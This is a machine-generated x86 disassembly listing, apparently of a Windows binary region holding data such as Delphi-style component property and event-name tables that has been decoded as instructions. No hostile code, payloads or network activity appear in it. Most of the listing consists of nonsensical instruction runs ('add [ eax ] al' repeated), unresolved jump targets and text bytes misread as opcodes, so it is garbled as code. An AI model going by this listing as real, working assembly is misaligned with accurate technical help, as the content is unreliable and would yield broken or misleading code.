les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
insb
jae r-xdata
add [ ebp - 0x3e7bffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
retn 0x44
sub_44ba9f
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
xor al 0x5e
inc ecx
add [ ecx + eax ] ch
jmp [ edi + edx * 8 + 0x10044 ]
sub_44bdfb
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
push edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
jo r-xdata
or [ ebp ] eax
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ edi + 0x6e ]
jo r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] al
pop edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc esp
outsd
arpl [ ebx - 0x44 ] bp
or eax [ ebp ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
add al dl
add [ eax ] al
call eax
add [ eax ] al
je r-xdata
inc esp
outsd
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe943be8d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
insb
inc ebx
insb
or al [ ebp ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax - 0x5d ] ch
inc ecx
add al ch
fld [ eax + eax + 0x4 ]
jb r-xdata
outsd
jne r-xdata
add [ eax ] al
sub [ 0x6e4f0900 ] 0x4d
pop edi
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
xor [ ecx ] 0x0
jb r-xdata
call 0xffffffffd845044a
add [ eax ] al
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
pop esp
sbb al [ edx ]
inc eax
xor al 0x40
je r-xdata
jl r-xdata
inc esp
jb r-xdata
inc ebp
outsb
outsb
dec ebp
outsd
jne r-xdata
add [ cs : edi + ecx * 2 ] cl
pop edi
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
outsb
jb r-xdata
rcl [ ebp + eax * 2 + 0x44e67c00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ eax - 0x23 ] ah
inc esp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax - 0x18 ] bl
inc esp
add [ eax ] dl
fiadd [ eax + eax + 0x3c ]
fiadd [ eax + eax + 0x6c ]
call 0xffffffffdd78c2a2
inc esp
add [ edi - 0x185fffbc ] dl
inc esp
add [ eax + ebp * 8 ] ch
inc esp
add [ ebx + edx ] ah
inc esi
add [ ebp + ebx * 8 - 0x194bffbc ] al
inc esp
add [ eax ] bh
loopne r-xdata
add [ edi * 2 + 0x581c0045 ] al
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebx ] dl
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ eax + 0x48004213 ] dh
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
mov [ 0xffffffffa8f00041 ] eax
inc ecx
add [ edx + ebx * 8 + 0x44 ] bh
mov esp 0xe4004194
add [ edx + ebp * 4 - 0x54ebffbf ] cl
inc ecx
add [ eax + 0x80044db ] dh
lodsd [ esi ]
inc ecx
add ah bl
sahf
inc ecx
add [ eax ] al
lahf
inc ecx
add [ edi + ebx * 4 ] ah
inc ecx
add al bh
fiadd [ eax + eax + 0x68 ]
fild [ eax + eax - 0x80 ]
mov [ 0xffffffffa3740041 ] al
inc ecx
add [ eax + 0x80044db ] cl
cmpsb [ esi ] [ edi ]
inc ecx
add ah bl
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax ] ah
sub al [ eax ]
adc [ edi - 0x58bfffbf ] ah
inc ecx
add [ edi - 0x57bfffbf ] dl
inc ecx
add al bl
test eax 0xaa300041
inc ecx
add ah al
stosb [ edi ]
inc ecx
add [ esi ] dl
push esp
inc ebx
jne r-xdata
inc esp
fiadd [ eax + eax - 0x38 ]
call 0x445055e
mov al [ 0xffffffff9fdc0041 ]
insb
rol [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
or al 0x45
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x45
add [ eax ] cl
add [ esi + ebx * 8 - 0x214bffbc ] ch
inc esp
add [ esi + ebx * 8 - 0x213bffbc ] bh
inc esp
add [ eax + 0x500044e5 ] dl
out 0x44 al
add [ ebp - 0x19cfffbc ] dh
inc esp
add ah bh
in eax 0x44
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax - 0x22 ] bh
inc esp
add [ eax ] ah
sub al [ eax ]
call 0xffffffffe7b4c2d6
inc esp
add [ 0x4000100 ] cl
mov al 0x10
mov al 0x11
mov ebp 0x2c002b
sub eax 0xb3008700
push [ edx - 0x4f004e01 ]
push [ ebp + 0x44de88ff ]
add al ch
fiadd [ eax + eax - 0x4 ]
fiadd [ eax + eax + 0x24 ]
in al 0x44
add [ eax ] al
add [ eax ] al
xchg esp eax
retn 0x44
je r-xdata
rol [ eax + eax + 0x14 ] 0x0
add [ eax ] al
test al 0x6a
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
dec esp
popad
jbe r-xdata
test [ ecx ] dh
inc eax
add [ eax + 0x48004031 ] ah
sbb eax [ edx ]
je r-xdata
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
imul ebp [ esi + 0x67 ] 0xc1089073
inc esp
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
les ecx [ 0x1000045 ]
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add ah al
call 0x1bc0c3b2
inc edx
add [ eax - 0x4fffbab7 ] dh
sbb eax [ edx ]
pop esp
dec edx
inc ebp
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c4505a4
dec eax
inc ebp
add al ch
call 0x4954c3d6
inc ebp
add [ eax ] cl
pop ds
inc esi
add [ eax + eax * 4 + 0x45 ] ah
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ eax ] ah
jmp 0x4a3cc402
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x73 ]
inc eax
add al bh
retn 0x44
fadd [ eax + eax + 0x54 ]
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
je r-xdata
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esi + ebx * 4 - 0x6b43ffbf ] ch
inc ecx
add ah ah
xor al 0x40
jb r-xdata
add al bl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc ecx
add [ eax + 0x680044da ] ah
mov [ 0xffffffffd9e80041 ] eax
inc esp
add [ edx + ebx * 8 ] al
inc esp
add al cl
inc ecx
add [ esp + edx * 4 - 0x5f1bffbf ] bh
inc ecx
add ah bl
lahf
adc eax [ edx ]
dec eax
je r-xdata
inc ecx
add ah dl
in eax 0x44
imul ebp [ esi + 0x67 ] 0x44c06c73
add [ eax + 0x416b ] dl
add [ eax ] cl
push ebx
je r-xdata
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
inc esp
inc ebx
je r-xdata
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add ah ah
fild [ eax + eax + 0x68 ]
leave
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
insb
jae r-xdata
add [ ebp - 0x3e7bffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
retn 0x44
sub_44c3fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
lds eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax * 8 - 0x3ad1ffbc ] dl
inc esp
add [ edx + eax ] cl
add [ eax ] al
fcom [ edi ]
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x54004581 ] bl
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ ecx + ebp * 8 - 0x3697ffbc ] al
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
rcl [ ebp + eax * 2 + 0x45930000 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] ch
0xea4c0044 0x44
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ eax - 0x16 ] dl
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
sub_44c4c8
xor al 0xbd
inc ebp
add [ edx + eax * 8 + 0x45 ] dl
add [ ebx + eax * 4 - 0x75b7ffbb ] dh
inc ebp
add al ch
xchg edi eax
inc ebp
add [ eax - 0x15 ] al
inc esp
add al dl
xchg esp eax
inc ebp
add [ eax ] al
xchg ebx eax
inc ebp
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] ch
0xea4c0044 0x44
sub_44c596
inc esp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x54004581 ] bl
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax - 0x15 ] bh
inc esp
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
rcl [ ebp + eax * 2 + 0x44ecc800 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] ch
0xea4c0044 0x44
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ eax - 0x16 ] dl
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
sub_44c63c
xor al 0xbd
inc ebp
add [ edx + eax * 8 + 0x45 ] dl
add [ ebx + eax * 4 - 0x75b7ffbb ] dh
inc ebp
add al ch
xchg edi eax
inc ebp
add [ esp + ebp * 8 - 0x6b2fffbc ] cl
inc ebp
add al cl
in al dx
inc esp
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] ch
0xea4c0044 0x44
sub_44c688
add al 0xec
inc esp
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
dec eax
push esp
in al dx
inc esp
add [ ebp + ebp * 8 + 0x44 ] ah
add al ch
in eax dx
inc esp
add al ah
in al dx
inc esp
add [ eax - 0x12 ] ch
inc esp
add [ esi + ebp * 8 ] bh
inc esp
add ah bl
jmp r-xdata
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x8
inc ebp
add [ ecx ] ah
add bh bh
mov al [ 0x3c00454d ]
dec esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
test al 0x5e
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add dh bh
jo r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
[ eax - 0x14 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
add [ eax + eax ] dh
jmp [ eax ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
test al 0x7
inc ebp
add [ edx + ebx * 2 + 0x45 ] cl
add [ edx + ebx * 2 + 0x45 ] bh
add [ eax + 0x7a ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
add [ eax ] dl
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
jg r-xdata
add [ ebp ] al
jpe r-xdata
add bh bh
and [ edi + 0x45 ] bh
jpe r-xdata
add [ ecx ] al
add bh bh
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc [ eax + 0x5b ]
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
add [ ebp ] al
adc al 0x2
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebp
add [ eax + 0x5b ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
add bh bh
inc eax
pop ebx
jb r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
add [ 0x6e450700 ] dl
popad
bound ebp [ ebp + 0x64 ]
cmp [ esi ] ch
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add bh bh
add al 0x5a
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
insb
pop ecx
inc ebp
add al cl
jpe r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070021 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
jmp r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
push [ ebp + eax * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
add [ eax ] al
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
[ ecx + ebx * 2 + 0x45 ]
adc [ eax ] al
cdq
add [ eax ] al
[ ebx + ebx * 2 + 0x5b640045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
or al 0x45
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
adc [ eax ] al
0xc0ff0000 0x455b
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
pop es
inc ebp
add [ eax * 8 - 0x3a63ffbb ] bl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
outsb
je r-xdata
loopne r-xdata
jo r-xdata
or [ ebp ] eax
cwde
or al [ ebp ]
loopne r-xdata
add [ eax + 0x4f090025 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
add [ eax ] 0x0
or eax [ ebp ]
call 0xffffffffe943ca49
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
inc esp
jb r-xdata
lds eax [ ebp ]
pushfd
lds eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb eax 0x61540800
bound ecx [ edi + 0x72 ]
jb r-xdata
push 0x6948776f
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
or eax 0x1000045
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
or [ ebp ] eax
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
jmp eax
add bh bh
loopne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
adc [ eax ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
jo r-xdata
dec edi
inc esi
add [ eax + eax ] bh
inc [ edx + ebx * 2 ]
add [ eax ] al
clc
retn
adc al 0x2
push ebp
jo r-xdata
adc eax [ edx ]
dec eax
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x54004581 ] bl
into
inc ebp
jb r-xdata
arpl [ ebx - 0x44 ] bp
or eax [ ebp ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
push ebx
je r-xdata
dec edi
outsb
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002a ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
pop edi
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
inc ebp
add [ esi + ecx * 8 + 0x45 ] dl
inc esp
outsd
jb r-xdata
call 0xffffffffd84510b4
add [ eax ] al
outsb
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002e ] al
inc ebp
add al ah
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
jns r-xdata
jb r-xdata
je r-xdata
or al [ ebp ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
rcl [ ebp + eax * 2 + 0x44f0fc00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ edi + ebp * 8 ] dl
inc esp
add [ eax ] bl
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ eax - 0x16 ] dl
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
add [ edx + ebx + 0x42 ] bh
add [ esi + ebp * 8 - 0x3697ffbc ] dh
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
push esp
pop ss
inc edx
inc esp
jb r-xdata
outsb
dec edi
jae r-xdata
add [ eax ] 0x0
pop edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
js r-xdata
inc ebp
outsd
jo r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
cmp al 0x83
mov ah cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
int 0x44
add [ edx - 0x33 ] dh
inc esp
add [ edx + eax ] dl
add [ eax ] al
jmp eax
dec esp
or al [ ebp ]
jns r-xdata
je r-xdata
outsb
